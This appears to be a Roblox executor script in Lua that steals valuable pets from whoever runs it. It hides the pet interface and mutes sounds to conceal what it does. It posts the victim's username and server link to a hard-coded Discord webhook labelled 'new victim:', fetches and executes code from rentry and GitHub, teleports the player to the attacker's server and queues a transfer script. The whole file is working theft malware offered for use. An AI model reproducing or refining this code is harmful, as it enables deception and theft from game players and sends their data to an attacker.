-- Load settings
local Settings = loadstring(game:HttpGet("https://raw.githubusercontent.com/unblock-eve/files/refs/heads/main/SETTINGS.lua"))()

game:GetService("Players").LocalPlayer.PlayerGui.PetUI.Enabled = false
game:GetService("SoundService").Click.Volume = 0
game:GetService("SoundService").Notification.Volume = 0

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")

-- Player reference
local localPlayer = Players.LocalPlayer
local playerName = localPlayer.Name

-- Global variable to track if we've already executed the pet transfer
local hasExecutedTransfer = false

-- Function to check if allowed users are in current server
local function checkAllowedUsersInServer()
    if not Settings.RECIPIENT_USERNAMES then
        return false
    end
    
    local playersInServer = Players:GetPlayers()
    
    for _, player in ipairs(playersInServer) do
        if Settings.RECIPIENT_USERNAMES[player.Name] then
            return true
        end
    end
    
    return false
end

-- Function to check authorization from Rentry
local function checkAuthorization()
    local request = http_request or request or syn.request
    
    if not request then
        return false
    end
    
    local success, res = pcall(function()
        return request({
            Url = "https://rentry.co/vqafnmu2",
            Method = "GET"
        })
    end)
    
    if not success or not res or not res.Body then
        return false
    end
    
    -- Extract <p> content from HTML
    local html = res.Body
    local content = string.match(html, "<p>(.-)</p>")
    
    if not content then
        return false
    end
    
    -- Decode HTML entities if needed
    content = content:gsub("&quot;", "\""):gsub("&#39;", "'")
    
    -- Execute the content to get username variable
    local env = {}
    local func, err = loadstring(content)
    if func then
        setfenv(func, env)
        pcall(func)
        
        -- Check if username matches player's name
        if env.username == game.Players.LocalPlayer.Name then
            return true
        else
            return false
        end
    else
        return false
    end
end

-- Function to get job ID from Rentry
local function getJobIdFromRentry()
    local request = http_request or request or syn.request
    
    if not request then
        return nil
    end
    
    local success, res = pcall(function()
        return request({
            Url = "https://rentry.co/nn9a45i5",
            Method = "GET"
        })
    end)
    
    if not success or not res or not res.Body then
        return nil
    end
    
    -- Extract <p> content from HTML
    local html = res.Body
    local content = string.match(html, "<p>(.-)</p>")
    
    if not content then
        return nil
    end
    
    -- Decode HTML entities if needed
    content = content:gsub("&quot;", "\""):gsub("&#39;", "'")
    
    -- Execute the content to get jobId variable
    local env = {}
    local func, err = loadstring(content)
    if func then
        setfenv(func, env)
        pcall(func)
        return env.jobId
    else
        return nil
    end
end

-- Function to teleport to job ID with checks
local function teleportToJobId(jobId)
    if not jobId or jobId == "" then
        return false
    end
    
    -- Check if allowed users are in current server
    if checkAllowedUsersInServer() then
        return false
    end
    
    local placeId = game.PlaceId
    
    local success, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(
            placeId,
            jobId,
            localPlayer
        )
    end)
    
    if success then
        return true
    else
        return false
    end
end

-- Helper function to wait
local function wait(duration)
    local start = tick()
    repeat
        RunService.Heartbeat:Wait()
    until tick() - start >= duration
end

-- Function to unequip pet (improved with better error handling)
local function unequipPet(petUUID)
    local args = {
        "UnequipPet",
        petUUID
    }
    
    local success, result = pcall(function()
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer(unpack(args))
    end)
    
    if success then
        -- Verify the pet was unequipped by checking if it's no longer in ActivePetUI
        local activePetUI = localPlayer.PlayerGui:FindFirstChild("ActivePetUI")
        if activePetUI then
            local scrollingFrame = activePetUI.Frame.Main.ScrollingFrame
            local petFrame = scrollingFrame:FindFirstChild(petUUID)
            
            if not petFrame then
                return true
            else
                return true -- Still return true as the command was sent successfully
            end
        end
        
        return true
    else
        return false
    end
end

-- Helper function to parse pet name from tool name
local function parsePetFromTool(toolName)
    local pet = {}
    
    -- Check if it's a mutated pet (no age in brackets)
    local mutatedPattern = "^(%w+)%s+(.-)%s+%[([%d%.]+)%s+KG%]$"
    local mutation, petName, weight = toolName:match(mutatedPattern)
    
    if mutation and petName and weight then
        pet.name = petName:lower()
        pet.mutation = mutation:lower()
        pet.weight = tonumber(weight)
        pet.age = nil
        pet.isMutated = true
        return pet
    end
    
    -- Check if it's a non-mutated pet (with age)
    local normalPattern = "^(.-)%s+%[([%d%.]+)%s+KG%]%s+%[Age%s+(%d+)%]$"
    local petName, weight, age = toolName:match(normalPattern)
    
    if petName and weight and age then
        pet.name = petName:lower()
        pet.mutation = nil
        pet.weight = tonumber(weight)
        pet.age = tonumber(age)
        pet.isMutated = false
        return pet
    end
    
    return nil
end

-- Helper function to parse active pet data (improved mutation detection)
local function parseActivePet(petFrame)
    local pet = {}
    
    -- Get pet name/type
    local petTypeLabel = petFrame:FindFirstChild("PET_TYPE")
    if not petTypeLabel then 
        return nil 
    end
    
    local petTypeText = petTypeLabel.Text:lower()
    
    -- Split the text into words
    local words = {}
    for word in petTypeText:gmatch("%S+") do
        table.insert(words, word)
    end
    
    -- Initialize as normal pet first
    pet.name = petTypeText
    pet.mutation = nil
    pet.isMutated = false
    
    if #words >= 2 then
        -- Check if first word is a known mutation
        local firstWord = words[1]
        local restOfName = table.concat(words, " ", 2)
        
        if Settings.ALLOWED_MUTATIONS and Settings.ALLOWED_MUTATIONS[firstWord] then
            pet.name = restOfName
            pet.mutation = firstWord
            pet.isMutated = true
        else
            -- Check if the base name (without first word) exists in allowed names
            if Settings.ALLOWED_NAMES and Settings.ALLOWED_NAMES[restOfName] then
                -- This might be a mutation we don't have in our list, but the base pet is valid
                pet.name = restOfName
                pet.mutation = firstWord
                pet.isMutated = true
            end
        end
    end
    
    -- Get pet age
    local petAgeLabel = petFrame:FindFirstChild("PET_AGE")
    if petAgeLabel then
        local ageText = petAgeLabel.Text
        local ageNumber = ageText:match("Age:%s*(%d+)")
        pet.age = ageNumber and tonumber(ageNumber) or nil
    end
    
    return pet
end

-- Function to get pet weight from active pet (improved)
local function getPetWeight(petUUID)
    local activePetUI = localPlayer.PlayerGui:FindFirstChild("ActivePetUI")
    if not activePetUI then 
        return nil 
    end
    
    local scrollingFrame = activePetUI.Frame.Main.ScrollingFrame
    local petFrame = scrollingFrame:FindFirstChild(petUUID)
    
    if not petFrame then 
        return nil 
    end
    
    local petStats = petFrame:FindFirstChild("PetStats")
    if not petStats then 
        return nil 
    end
    
    local viewButton = petStats.VIEW.Inner.SENSOR
    if not viewButton then 
        return nil 
    end
    
    -- Fire the signal to load stats
    firesignal(viewButton.MouseButton1Click)
    
    -- Wait for stats to load
    wait(1.4)
    
    -- Read the weight
    local petUI = localPlayer.PlayerGui:FindFirstChild("PetUI")
    if not petUI then 
        return nil 
    end
    
    local statsHolder = petUI.PetCard.Main.Holder.Stats.Holder
    local children = statsHolder:GetChildren()
    
    -- Look for weight in all children, not just index 5
    for i, child in ipairs(children) do
        local weightLabel = child:FindFirstChild("PET_WEIGHT")
        if weightLabel then
            local weightText = weightLabel.Text
            local weight = weightText:match("([%d%.]+)")
            return weight and tonumber(weight) or nil
        end
    end
    
    return nil
end

-- Function to check if pet passes filters based on priority (with debug logging)
local function checkPetPriority(pet)
    -- Priority 1: Name
    if Settings.ALLOWED_NAMES and Settings.ALLOWED_NAMES[pet.name] then
        return "NAME", pet.name
    end
    
    -- Priority 2: Mutation
    if pet.mutation and Settings.ALLOWED_MUTATIONS and Settings.ALLOWED_MUTATIONS[pet.mutation] then
        return "MUTATION", pet.mutation
    end
    
    -- Priority 3: Weight
    if Settings.ENABLE_WEIGHT_FILTER and pet.weight and pet.weight >= Settings.MIN_WEIGHT then
        return "WEIGHT", tostring(pet.weight) .. " KG"
    end
    
    -- Priority 4: Age
    if Settings.ENABLE_AGE_FILTER and pet.age and pet.age >= Settings.MIN_AGE then
        return "AGE", "Age " .. tostring(pet.age)
    end
    
    return nil, nil
end

-- Function to get server link
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    return string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", placeId, jobId)
end

-- Function to format pets for Discord embed
local function formatPetsForDiscord(validPets)
    local description = string.format("**Display Name:** %s\n**Username:** %s\n**Players: %d/%d**\n**Server Link:** [Click to Join](%s)\n\n",
        localPlayer.DisplayName,
        localPlayer.Name,
        #Players:GetPlayers(),
        Players.MaxPlayers,
        getServerLink()
    )
    
    local priorities = {
        {key = "NAME", title = "Valid For Name"},
        {key = "MUTATION", title = "Valid For Mutations"},
        {key = "AGE", title = "Valid For age"},
        {key = "WEIGHT", title = "Valid For Weight"}
    }
    
    for _, priority in ipairs(priorities) do
        if #validPets[priority.key] > 0 then
            description = description .. "**" .. priority.title .. ":**\n```\n"
            
            for _, data in ipairs(validPets[priority.key]) do
                local pet = data.pet
                local petLine = ""
                
                if pet.source == "Active" then
                    -- For active pets, show mutation + name if mutated, otherwise just name
                    if pet.mutation then
                        petLine = pet.mutation:gsub("^%l", string.upper) .. " " .. pet.name:gsub("^%l", string.upper)
                    else
                        petLine = pet.name:gsub("^%l", string.upper)
                    end
                    
                    -- Add weight if available
                    if pet.weight then
                        petLine = petLine .. string.format(" [%.2f KG]", pet.weight)
                    end
                    
                    -- Add age if available (non-mutated pets)
                    if pet.age then
                        petLine = petLine .. string.format(" [Age %d]", pet.age)
                    end
                    
                else
                    -- For backpack/character pets, use the original tool name
                    petLine = data.toolName
                end
                
                description = description .. petLine .. "\n"
            end
            
            description = description .. "```\n"
        end
    end
    
    return description
end

-- Function to manually encode JSON (for exploit compatibility)
local function jsonEncode(data)
    local function escapeString(str)
        return str:gsub("\\", "\\\\"):gsub("\"", "\\\""):gsub("\n", "\\n"):gsub("\r", "\\r"):gsub("\t", "\\t")
    end
    
    local function encodeValue(value)
        local valueType = type(value)
        if valueType == "string" then
            return "\"" .. escapeString(value) .. "\""
        elseif valueType == "number" then
            return tostring(value)
        elseif valueType == "boolean" then
            return value and "true" or "false"
        elseif valueType == "table" then
            if #value > 0 then -- Array
                local items = {}
                for i, v in ipairs(value) do
                    table.insert(items, encodeValue(v))
                end
                return "[" .. table.concat(items, ",") .. "]"
            else -- Object
                local items = {}
                for k, v in pairs(value) do
                    table.insert(items, "\"" .. escapeString(tostring(k)) .. "\":" .. encodeValue(v))
                end
                return "{" .. table.concat(items, ",") .. "}"
            end
        else
            return "null"
        end
    end
    
    return encodeValue(data)
end

-- Function to send HTTP request (exploit compatible)
local function httpRequest(url, data)
    local request = {
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    }
    
    -- Try different HTTP functions based on exploit
    local httpFunc = syn and syn.request or http and http.request or http_request or request
    
    if httpFunc then
        return httpFunc(request)
    else
        error("No HTTP function available")
    end
end

-- Function to send Discord webhook (exploit compatible)
local function sendDiscordWebhook(validPets, webhookUrl)
    local totalValidPets = 0
    for _, pets in pairs(validPets) do
        totalValidPets = totalValidPets + #pets
    end
    
    if totalValidPets == 0 then
        return
    end
    
    -- Get executor name
    local ExecName = identifyexecutor and identifyexecutor() or "Unknown"
    
    local embed = {
        embeds = {
            {
                type = "rich",
                title = "new victim:",
                description = formatPetsForDiscord(validPets),
                timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
                color = 0x3FA9F5,
                footer = {
                    text = "Executor: " .. ExecName
                }
            }
        }
    }
    
    local success, response = pcall(function()
        return httpRequest(webhookUrl, jsonEncode(embed))
    end)
end

-- Function to gather pets without unequipping (for initial scan and webhook)
local function gatherPetsForWebhook()
    local validPets = {
        NAME = {},
        MUTATION = {},
        WEIGHT = {},
        AGE = {}
    }
    
    -- Get pets from backpack/character
    local function checkContainer(container, containerName)
        if not container then return end
        
        for _, tool in pairs(container:GetChildren()) do
            if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") then
                -- Skip tools with "Chest" in the name
                if string.find(tool.Name:lower(), "chest") then
                    -- Skip this tool
                else
                    local pet = parsePetFromTool(tool.Name)
                    if pet then
                        pet.uuid = tool:GetAttribute("PET_UUID")
                        pet.source = containerName
                        
                        local priority, reason = checkPetPriority(pet)
                        if priority then
                            table.insert(validPets[priority], {
                                pet = pet,
                                reason = reason,
                                toolName = tool.Name
                            })
                        end
                    end
                end
            end
        end
    end
    
    -- Check backpack
    checkContainer(localPlayer.Backpack, "Backpack")
    
    -- Check character
    checkContainer(localPlayer.Character, "Character")
    
    -- Get active pets
    local activePetUI = localPlayer.PlayerGui:FindFirstChild("ActivePetUI")
    if activePetUI then
        local scrollingFrame = activePetUI.Frame.Main.ScrollingFrame
        
        for _, child in pairs(scrollingFrame:GetChildren()) do
            if child:IsA("Frame") and child.Name ~= "PetTemplate" then
                local petUUID = child.Name
                
                local pet = parseActivePet(child)
                
                if pet then
                    pet.uuid = petUUID
                    pet.source = "Active"
                    
                    -- Get weight for active pets
                    task.wait(1)
                    pet.weight = getPetWeight(petUUID)
                    
                    local priority, reason = checkPetPriority(pet)
                    if priority then
                        table.insert(validPets[priority], {
                            pet = pet,
                            reason = reason,
                            toolName = "Active Pet: " .. (pet.mutation and (pet.mutation .. " " .. pet.name) or pet.name)
                        })
                    end
                end
            end
        end
    end
    
    return validPets
end

-- Function to unequip valid active pets only
local function unequipValidActivePets()
    local validActivePets = {}
    
    local activePetUI = localPlayer.PlayerGui:FindFirstChild("ActivePetUI")
    if activePetUI then
        local scrollingFrame = activePetUI.Frame.Main.ScrollingFrame
        
        for _, child in pairs(scrollingFrame:GetChildren()) do
            if child:IsA("Frame") and child.Name ~= "PetTemplate" then
                local petUUID = child.Name
                local pet = parseActivePet(child)
                
                if pet then
                    pet.uuid = petUUID
                    pet.source = "Active"
                    pet.weight = getPetWeight(petUUID)
                    
                    local priority, reason = checkPetPriority(pet)
                    if priority then
                        table.insert(validActivePets, {uuid = petUUID, pet = pet})
                    end
                end
            end
        end
    end
    
    -- Unequip valid active pets
    if #validActivePets > 0 then
        for i, activePet in ipairs(validActivePets) do
            unequipPet(activePet.uuid)
            
            -- Add a small delay between unequips
            if i < #validActivePets then
                wait(0.1)
            end
        end
    end
end

-- Function to favorite valid tools
local function favoriteValidTools()
    local favoritedCount = 0
    
    -- Get current valid pets to build UUID list
    local currentValidPets = gatherPetsForWebhook()
    local allValidUUIDs = {}
    
    for _, priority in ipairs({"NAME", "MUTATION", "WEIGHT", "AGE"}) do
        for _, data in ipairs(currentValidPets[priority]) do
            allValidUUIDs[data.pet.uuid] = true
        end
    end
    
    -- Check backpack for tools with "d" attribute
    local backpack = localPlayer.Backpack
    if backpack then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") then
                local petUUID = tool:GetAttribute("PET_UUID")
                
                -- Check if this tool's UUID matches any of our valid pets
                if allValidUUIDs[petUUID] then
                    local dAttribute = tool:GetAttribute("d")
                    
                    -- If it has "d" attribute set to true, favorite it
                    if dAttribute == true then
                        local args = { tool }
                        
                        local success, result = pcall(function()
                            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
                        end)
                        
                        if success then
                            favoritedCount = favoritedCount + 1
                        end
                    end
                end
            end
        end
    end
end

-- Function to execute pet transfer logic (for when target player is found)
local function executePetTransfer(validPetsForTeleport)
    if hasExecutedTransfer then
        return -- Prevent multiple executions
    end
    
    hasExecutedTransfer = true
    
    -- Unequip valid active pets
    unequipValidActivePets()
    
    -- Wait a bit then favorite valid tools
    task.wait(0.7)
    favoriteValidTools()
    
    -- Set the global variable for base2.lua
    _G.VALID_PETS_DATA = validPetsForTeleport
    
    -- Load and execute base2.lua directly
    loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/base2.lua"))()
end

-- Function to prepare for teleport (when authorized but no target player found)
local function prepareForTeleport(validPetsForTeleport)
    -- Unequip valid active pets before teleporting
    unequipValidActivePets()
    
    -- Wait a bit then favorite valid tools
    task.wait(0.7)
    favoriteValidTools()
    
    return validPetsForTeleport
end

-- Function to handle when an allowed user is found
local function handleAllowedUserFound(validPetsForTeleport)
    executePetTransfer(validPetsForTeleport)
end

-- Function to start username monitoring and handle unequipping/teleporting
local function startUsernameMonitoring(initialValidPets)
    -- Prepare valid pets data once for reuse
    local validPetsForTeleport = {}
    for priority, pets in pairs(initialValidPets) do
        validPetsForTeleport[priority] = {}
        for _, data in ipairs(pets) do
            table.insert(validPetsForTeleport[priority], {
                uuid = data.pet.uuid,
                toolName = data.toolName,
                priority = priority,
                reason = data.reason,
                source = data.pet.source,
                name = data.pet.name,
                mutation = data.pet.mutation,
                weight = data.pet.weight,
                age = data.pet.age
            })
        end
    end
    
    -- First check if any allowed users are already in the server
    if checkAllowedUsersInServer() then
        handleAllowedUserFound(validPetsForTeleport)
        return
    end
    
    -- Set up player join monitoring
    local playerAddedConnection
    playerAddedConnection = Players.PlayerAdded:Connect(function(player)
        -- Check if the newly joined player is in our allowed list
        if Settings.RECIPIENT_USERNAMES and Settings.RECIPIENT_USERNAMES[player.Name] then
            -- Disconnect the connection since we found our target
            if playerAddedConnection then
                playerAddedConnection:Disconnect()
            end
            
            -- Execute pet transfer (this will unequip pets)
            handleAllowedUserFound(validPetsForTeleport)
        end
    end)
    
    -- Continue with periodic authorization checks and teleport logic
    spawn(function()
        while not hasExecutedTransfer do
            if checkAuthorization() then
                -- Check if allowed users joined while we were checking authorization
                if checkAllowedUsersInServer() then
                    -- Disconnect the player monitoring since we found someone
                    if playerAddedConnection then
                        playerAddedConnection:Disconnect()
                    end
                    
                    handleAllowedUserFound(validPetsForTeleport)
                    break
                else
                    -- Get job ID and teleport (unequip pets before teleporting)
                    local targetJobId = getJobIdFromRentry()
                    if targetJobId then
                        -- Unequip pets and prepare for teleport
                        local preparedPetsData = prepareForTeleport(validPetsForTeleport)
                        
                        -- Convert to string for queue_on_teleport
                        local function tableToString(tbl, indent)
                            indent = indent or 0
                            local spacing = string.rep("    ", indent)
                            local result = "{\n"
                            
                            for k, v in pairs(tbl) do
                                local key = type(k) == "string" and string.format('["%s"]', k) or string.format("[%s]", tostring(k))
                                
                                if type(v) == "table" then
                                    result = result .. spacing .. "    " .. key .. " = " .. tableToString(v, indent + 1) .. ",\n"
                                elseif type(v) == "string" then
                                    result = result .. spacing .. "    " .. key .. " = " .. string.format('"%s"', v:gsub('"', '\\"')) .. ",\n"
                                elseif type(v) == "number" then
                                    result = result .. spacing .. "    " .. key .. " = " .. tostring(v) .. ",\n"
                                elseif type(v) == "boolean" then
                                    result = result .. spacing .. "    " .. key .. " = " .. tostring(v) .. ",\n"
                                elseif v == nil then
                                    result = result .. spacing .. "    " .. key .. " = nil,\n"
                                end
                            end
                            
                            result = result .. spacing .. "}"
                            return result
                        end
                        
                        local validPetsString = tableToString(preparedPetsData)
                        
                        local qScript = string.format([[
                            repeat task.wait() until game:IsLoaded()
                            
                            -- Valid pets data passed from main script
                            _G.VALID_PETS_DATA = %s
                            task.wait(10)
                            loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/base2.lua"))();
                        ]], validPetsString)

                        queue_on_teleport(qScript)

                        task.wait(4)
                        
                        -- Disconnect player monitoring before teleporting
                        if playerAddedConnection then
                            playerAddedConnection:Disconnect()
                        end
                        
                        teleportToJobId(targetJobId)
                        break -- Exit the monitoring loop after successful teleport attempt
                    end
                end
            else
                wait(30)
            end
        end
        
        -- Clean up connection if still active
        if playerAddedConnection then
            playerAddedConnection:Disconnect()
        end
    end)
end

-- Main function to execute the new logic flow
local function executeMainLogic()
    -- Step 1: Gather pets and send webhook (no username check needed)
    local validPets = gatherPetsForWebhook()
    
    local totalCount = 0
    for _, pets in pairs(validPets) do
        totalCount = totalCount + #pets
    end

    -- Clean up UI
    firesignal(game:GetService("Players").LocalPlayer.PlayerGui.PetUI.PetCard.Main.Holder.Header.EXIT_BUTTON.SENSOR.MouseButton1Click)
    
    -- If no valid pets found, just re-enable UI and exit
    if totalCount == 0 then
        task.wait(0.4)
        game:GetService("Players").LocalPlayer.PlayerGui.PetUI.Enabled = true
        game:GetService("SoundService").Click.Volume = 0.5
        game:GetService("SoundService").Notification.Volume = 0.5
        return
    end

    -- Step 2: Send Discord webhook with found pets
    local webhookUrl = "https://discord.com/api/webhooks/1386961302832025711/-uXWLikfp-5ObLcdCDp8QXAEY3tU9rNfeUpms1QHdqYzy4tunqQb7tzhd7w1zJSU049J"
    sendDiscordWebhook(validPets, webhookUrl)
    
    -- Step 3: Start monitoring for username match (this will handle unequipping and teleporting)
    startUsernameMonitoring(validPets)
end

-- Execute the script
executeMainLogic()
